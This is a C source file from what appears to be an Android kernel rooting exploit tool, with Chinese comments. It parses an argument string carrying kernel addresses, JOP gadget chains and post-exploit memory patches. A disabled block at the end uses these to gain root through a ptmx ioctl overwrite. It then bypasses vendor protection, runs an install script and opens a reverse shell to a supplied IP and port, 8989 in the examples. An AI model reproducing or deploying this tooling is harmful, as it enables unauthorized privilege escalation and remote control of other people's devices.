/*
  copyright © idhyt3r@gmail.com

  android root adp parameter parse.

  example:
  ./rootz "n=1001&k=[101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70;201=0xffffffc00074c954;]&j=[0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]&p=[0xffffffc00193a1bc=0x0=0x4;]&&r=[901=/data/local/tmp/install.sh;902=192.168.199.213;903=8989;]&"  
  说明:
  n: 方案号
  k: 内核函数地址, 需要提前声明, 包含在[]中，用;分割, 结尾必须包含;
  j: jop地址, 包含在[]中, 用;分割, 结尾必须包含; 每条jop以0x0=0x0结尾;
  p: root后内存修复, 包含在[]中, 用;分割, 结尾必须包含;
  r: 反弹shell和脚本, 需要提前声明, 包含在[]中, 用;分割, 结尾必须包含;
  
  参数重每个字段由&分割, 结尾必须包含&, 其中支持r字段由loader传入, 为了区分, 用&&r=作为起始

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "param.h"
#include "log.h"
#include "dict.h"

dict_t *transl_param_dict;

static int parse_snum(char *value) {
  dict_set(transl_param_dict, "n", value);
  return 0;
}

/*
  解析提前定义的参数 kfun, rshell, 存放在全局字典中。
  key = k, value = [101=0xffffffc001a044a0;102=0x48;103=0xffffffc000318610;104=0xffffffc001779fe0;105=0x70;]
  key = r, value = [901=/data/local/tmp/install.sh;902=192.168.0.105;903=8989;]
*/
static int parse_macro(char *value) {
  char *pos;
  char *subpos;
  char *split;

  if (!(pos = strchr(value, '['))) {
    log_dump(LOG_ERR, "[-] parse_macro error!\n");
    return -1;
  }

  pos++;
  // log_dump(LOG_DEBUG, "pos %p %s\n", pos, pos);

  while((subpos = strchr(pos, ';')) != NULL) {
    *subpos = '\0';
    if (!(split = strchr(pos, '='))) {
      log_dump(LOG_ERR, "[-] = error!\n");
      return -2;
    }
    *split = '\0';
    split++;
    // log_dump(LOG_DEBUG, "%s = %s\n", pos, split);
    dict_set(transl_param_dict, pos, split);
    pos = subpos + 1;
  }

#if 0
  char *k, *v;
  while (dict_iter(transl_param_dict, &k, (void **)&v)) printf("%s => %s\n", k, v);
#endif

  return 0;
}

static int parse_kfunc(char *value) {
  return parse_macro(value);
}

/*
  解析jop, 初始化jop_gadget, 预留5条jop
  key = j, value = [0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]
*/

static int parse_jop(char *value) {
  char *pos;
  char *subpos;
  char *split;
  unsigned long lvar[1];

  int padn = 1, jop_num = 0;
  unsigned long j_index, j_addr;
  int i = 0, j;

  if (!(pos = strchr(value, '['))) {
    log_dump(LOG_ERR, "[-] parse_jop error!\n");
    return -1;
  }

  pos++;
  // log_dump(LOG_DEBUG, "pos %p %s\n", pos, pos);

  split = "0x0=0x0";
  char *tmp = pos;
  while((subpos = strstr(tmp, split)) != NULL) {
    tmp = subpos + strlen(split);
    jop_num++;
  } 
  log_dump(LOG_DEBUG, "jop num = %d\n", jop_num);

  while((subpos = strchr(pos, ';')) != NULL) {
    *subpos = '\0';
    if (!(split = strchr(pos, '='))) {
      log_dump(LOG_ERR, "[-] = error!\n");
      return -2;
    }
    *split = '\0';
    split++;
    // log_dump(LOG_DEBUG, "%s = %s\n", pos, split);
    j_index = strtoul(pos, NULL, 16);
    j_addr = strtoul(split, NULL, 16);
    // log_dump(LOG_DEBUG, "j_index = 0x%lx, j_addr = 0x%lx\n", j_index, j_addr);

    if(j_index == 0x0 && j_addr == 0x0) {
      padn++;
      i = 0;
      goto next;
    }

    if (padn == 1) {
      j_jop1[i].index = j_index;
      j_jop1[i].addr = j_addr;
      i++;
    }else
    if (padn == 2) {
      j_jop2[i].index = j_index;
      j_jop2[i].addr = j_addr;
      i++;
    }else
    if (padn == 3) {
      j_jop3[i].index = j_index;
      j_jop3[i].addr = j_addr;
      i++;
    }else
    if (padn == 4) {
      j_jop4[i].index = j_index;
      j_jop4[i].addr = j_addr;
      i++;
    }else
    if (padn == 5) {
      j_jop5[i].index = j_index;
      j_jop5[i].addr = j_addr;
      i++;
    } else {
      
    }

next:
    pos = subpos + 1;

  }

  if(padn-1 > jop_num) {
    log_dump(LOG_ERR, "[-] too many jop! %d > %d\n", padn, jop_num);
    return -3;
  }

  return 0;
}

/*
  root之后修复内存初始化 p_patch
  key = p, value = [0xffffffc00193a1bc=0x0=0x4;]
*/
static int parse_patch(char *value) {
  char *pos;
  char *subpos;
  char *split;

  int padn = 0;
  unsigned long p_addr, p_value, p_len;

  // p_len = sizeof(unsigned long);

  if (!(pos = strchr(value, '['))) {
    log_dump(LOG_ERR, "[-] parse_fix error!\n");
    return -1;
  }

  pos++;
  // log_dump(LOG_DEBUG, "pos %p %s\n", pos, pos);

  while((subpos = strchr(pos, ';')) != NULL) {
    *subpos = '\0';
    if (!(split = strchr(pos, '='))) {
      log_dump(LOG_ERR, "[-] = error!\n");
      return -2;
    }
    *split = '\0';
    split++;

    // log_dump(LOG_DEBUG, "pos %s, split %s\n", pos, split);
    p_addr = strtoul(pos, NULL, 16);
    p_value = strtoul(split, NULL, 16);

    if (!(pos = strchr(split, '='))) {
      log_dump(LOG_ERR, "[-] = error!\n");
      return -3;
    }
    *pos = '\0';
    pos++;

    p_len = strtoul(pos, NULL, 16);
    log_dump(LOG_DEBUG, "p_addr = 0x%lx, p_value = 0x%lx, p_len = 0x%x\n", p_addr, p_value, p_len);

    p_patch[padn].addr = p_addr;
    p_patch[padn].value = p_value;
    p_patch[padn].len = p_len;
    padn++;

    pos = subpos + 1;
  }

  return 0;
}

/*
  rshell 部分由loader提供, 标识 &&r= 或者 &r=
*/
#define param_format
#ifdef param_format
char parse_params_format[0x400] = { 0 };
static int parse_args_format(char *args) {
  int err;
  char *pos;
  char *tag = "&&r=";
  if ((pos = strstr(args, "&&r="))) {
    *pos = '\0';
    pos++;
    sprintf(parse_params_format, "%s%s&", args, pos);
    err = 0;
  } else 
  if ((pos = strstr(args, "&r="))) {
    sprintf(parse_params_format, "%s&", args);
    err = 0;
  } else {
    sprintf(parse_params_format, "%s&", args);
    log_dump(LOG_DEBUG, "[-] not find rshell tags error!\n");
    err = -1;
  }

  return err;

}
#endif
/*
  root之后的工作, 反弹shell或执行脚本
  key = r, value = [901=/data/local/tmp/install.sh;902=192.168.0.105;903=8989;]

  ex: 该部分由loader提供, 标识 &&r=
*/
static int parse_rshell(char *value) {
  return parse_macro(value);
}

static int parse_key(char *key, char *value) {
  log_dump(LOG_DEBUG, "key = %s, value = %s\n", key, value);
  
  int err = 0;
  char *pos;

  int n;
  if(!strncmp(key, "n", 1)) {
    // log_dump(LOG_DEBUG, "sn\n");
    err = parse_snum(value);
  } else 

  if (!strncmp(key, "k", 1)) {
    // log_dump(LOG_DEBUG, "kfun\n");
    err = parse_kfunc(value);
  } else 

  if (!strncmp(key, "j", 1)) {
    // log_dump(LOG_DEBUG, "jop\n");
    err = parse_jop(value);
  } else 

  if (!strncmp(key, "p", 1)) {
    // log_dump(LOG_DEBUG, "patch\n");
    err = parse_patch(value);
  } else 
  if (!strncmp(key, "r", 1)) {
    // log_dump(LOG_DEBUG, "rshell\n");
    err = parse_rshell(value);
  } 

  else {
    log_dump(LOG_ERR, "error!\n");
    err = -1;
  }
  return err;

}

static void show_parse_param() {
  log_dump(LOG_DEBUG, "\ntransl_param_dict: %p\n", transl_param_dict);
  char *k, *v;
  while (dict_iter(transl_param_dict, &k, (void **)&v)) log_dump(LOG_DEBUG, "\t%s => %s\n", k, v);

  log_dump(LOG_DEBUG, "\nj_jop:\n");
  int i;
  unsigned long index, addr;
 
  log_dump(LOG_DEBUG, "\tjop1:\n");
  for(i = 0; i < 0x10; ++i) {
    index = j_jop1[i].index;
    addr = j_jop1[i].addr;
    log_dump(LOG_DEBUG, "\t {0x%lx, 0x%lx}\n", index, addr);
    if(index == 0x0 && addr == 0x0) break;
  }

  log_dump(LOG_DEBUG, "\tjop2:\n");
  for(i = 0; i < 0x10; ++i) {
    index = j_jop2[i].index;
    addr = j_jop2[i].addr;
    log_dump(LOG_DEBUG, "\t {0x%lx, 0x%lx}\n", index, addr);
    if(index == 0x0 && addr == 0x0) break;
  }

  log_dump(LOG_DEBUG, "\tjop3:\n");
  for(i = 0; i < 0x10; ++i) {
    index = j_jop3[i].index;
    addr = j_jop3[i].addr;
    log_dump(LOG_DEBUG, "\t {0x%lx, 0x%lx}\n", index, addr);
    if(index == 0x0 && addr == 0x0) break;
  }

  log_dump(LOG_DEBUG, "\tjop4:\n");
  for(i = 0; i < 0x10; ++i) {
    index = j_jop4[i].index;
    addr = j_jop4[i].addr;
    log_dump(LOG_DEBUG, "\t {0x%lx, 0x%lx}\n", index, addr);
    if(index == 0x0 && addr == 0x0) break;
  }

  log_dump(LOG_DEBUG, "\tjop5:\n");
  for(i = 0; i < 0x10; ++i) {
    index = j_jop5[i].index;
    addr = j_jop5[i].addr;
    log_dump(LOG_DEBUG, "\t {0x%lx, 0x%lx}\n", index, addr);
    if(index == 0x0 && addr == 0x0) break;
  }

  log_dump(LOG_DEBUG, "\np_patch:\n");
  unsigned long value;
  char len;
  for(i = 0; i < 0x10; ++i) {
    addr = p_patch[i].addr;
    value = p_patch[i].value;
    len = p_patch[i].len;
    log_dump(LOG_DEBUG, "\t {0x%lx, 0x%lx, 0x%x}\n", addr, value, len);
    if(addr == 0x0 && value == 0x0) break;
  }

}

// n=1001&k=[100=addr;101=addr;]&j=[offset=value;...;0x0=0x0;offset=value;...;0x0=0x0]&f=[addr=value;...;]&r=[901=install.sh;902=192.168.0.105;903=8989]&
int parse_args(int argc, char* argv[]){
  if (argc < 2) {
    log_dump(LOG_ERR, "no set param!\n");
    return -1;
  }

  // init dict
  transl_param_dict = (dict_t *)malloc(sizeof(dict_t));
  dict_init(transl_param_dict);

  char *pos;
  char *subpos;
  char *args = argv[1];

  // log_dump(LOG_DEBUG, "args = %s\n", args);

  // parse rshell prepare
#ifdef param_format
  parse_args_format(args);
  args = parse_params_format;
#endif

  // log_dump(LOG_DEBUG, "args = %s\n", args);


  while((pos = strchr(args, '&')) != NULL){
    *pos = '\0';
    log_dump(LOG_DEBUG, "args: %s\n", args);

    if ((subpos = strchr(args, '=')) != NULL) {
      *subpos = '\0';
      // log_dump(LOG_DEBUG, "%s = %s\n", args, subpos+1);
      if(0 != parse_key(args, subpos+1)) {
        log_dump(LOG_ERR, "parse_key %s error!\n", args);
        return -1;
      }

    } else {
      log_dump(LOG_ERR, "%s parse error!\n", args);
      return -1;
    }

    args = pos + 1;
  }

#if 1
  show_parse_param();
#endif

  return 0;
}

#if 0
/* ------------------ root define begin ------------------- */
#include "rootz.h"
#include "log.h"

/* adp args */
static int adp_sn;
static unsigned long adp_init_task;
static unsigned long adp_task_security_offset;

static unsigned long adp_ptmx_fops;
static unsigned long adp_ptmx_ioctl_offset;
static unsigned long adp_patch_ptmx_ioctl_jop;

/* run script path */
static char adp_script_path[0xff] = { 0 };

/* reverse shell ip&port */
static char adp_rshell_ip[0x40] = { 0 };
static char adp_rshell_port[0x10] = { 0 };

/*
  初始化适配参数
*/
#include "dict.h"

extern dict_t *transl_param_dict;

static int get_adp_ulval(char *name, unsigned long *value) {
  char *var;

  if (!dict_get(transl_param_dict, name, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get %s failed\n", name);
    return 0;
  }
  *value = strtoul(var, NULL, 16);
  log_dump(LOG_DEBUG, "%s = 0x%lx\n", name, *value);
  return 1;
}

static int get_adp_str(char *name, char *value, int len) {
  char *var;

  if (!dict_get(transl_param_dict, name, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get %s failed\n", name);
    return 0;
  }
  strncpy(value, var, len);
  log_dump(LOG_DEBUG, "%s = %s, %d\n", name, value, strlen(value));
}

static int rootz_before(int argc, char *argv[]) {
  // 设置日志路径, 不设置打印到控制台
  // set_logfile_path("/data/local/tmp/8890.log");
  // 适配参数初始化
  if (parse_args(argc, argv) < 0) {
    log_dump(LOG_ERR, "[-] parse_args failed\n");
    return -1;
  }

  char *var;

  // 0 failed

  /* root before */
  if (!dict_get(transl_param_dict, n_sn, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get n_sn failed\n");
    return -1;
  }
  adp_sn = atoi(var);
  log_dump(LOG_DEBUG, "adp_sn = %d\n", adp_sn);

  if(!get_adp_ulval(k_init_task, &adp_init_task)) return -1;
  if(!get_adp_ulval(k_task_security_offset, &adp_task_security_offset)) return -1;
  if(!get_adp_ulval(k_ptmx_fops, &adp_ptmx_fops)) return -1;
  if(!get_adp_ulval(k_ptmx_ioctl_offset, &adp_ptmx_ioctl_offset)) return -1;
  if(!get_adp_ulval(j_patch_ptmx_ioctl_jop, &adp_patch_ptmx_ioctl_jop)) return -1;

  /* root after */
  get_adp_str(r_script_path, adp_script_path, sizeof(adp_script_path));
  get_adp_str(r_rshell_ip, adp_rshell_ip, sizeof(adp_rshell_ip));
  get_adp_str(r_rshell_port, adp_rshell_port, sizeof(adp_rshell_port));

#if 0
  printf(" adp_init_task = 0x%lx\n", adp_init_task);
  printf(" adp_task_security_offset = 0x%lx\n", adp_task_security_offset);
  printf(" adp_ptmx_fops = 0x%lx\n", adp_ptmx_fops);
  printf(" adp_ptmx_ioctl_offset = 0x%lx\n", adp_ptmx_ioctl_offset);
  printf(" adp_patch_ptmx_ioctl_jop = 0x%lx\n", adp_patch_ptmx_ioctl_jop);

#endif


  return 0;
}

/*
  提权过后的操作
*/

static int rootz_after() {

  vendor_protect_bypass(transl_param_dict);

  if(strlen(adp_script_path)) {
    char run_cmd[0xff] = { 0 };
    memset(run_cmd, 0, sizeof(run_cmd));
    char work_dir[0xff] = { 0 };
    memset(work_dir, 0, sizeof(work_dir));
    full_path_to_dir(adp_script_path, work_dir);
    log_dump(LOG_DEBUG, "work_dir = %s\n", work_dir);
    if(strlen(work_dir)) {
      sprintf(run_cmd, "%s '%s'", adp_script_path, work_dir);
    } else {
      sprintf(run_cmd, "%s", adp_script_path);
    }
    run_shell_commond("/system/bin/sh", run_cmd);
  }
  if(strlen(adp_rshell_ip) && strlen(adp_rshell_port)) {
    log_dump(LOG_DEBUG, "rshell: ip = %s, port = %s\n", adp_rshell_ip, adp_rshell_port);
    rshell_simple(adp_rshell_ip, adp_rshell_port);
  }

  if(transl_param_dict) {
    dict_destory(transl_param_dict);
    free(transl_param_dict);
  }

  return 0;
}

/* ------------------ root define end ------------------- */

#endif

